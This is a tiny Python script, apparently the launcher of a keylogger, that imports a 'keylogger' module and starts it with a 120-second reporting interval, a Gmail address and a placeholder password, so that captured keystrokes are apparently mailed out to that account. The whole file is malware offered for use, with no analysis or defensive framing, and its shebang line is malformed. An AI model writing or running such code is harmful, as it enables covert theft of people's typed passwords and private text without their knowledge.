#!/usr/bin/env python3k

import keylogger

time_interval = 120
email = 'kaisersose099@gmail.com'
password = 'xxx'

my_keylogger = keylogger.KeyLogger(time_interval, email, password)
my_keylogger.start()
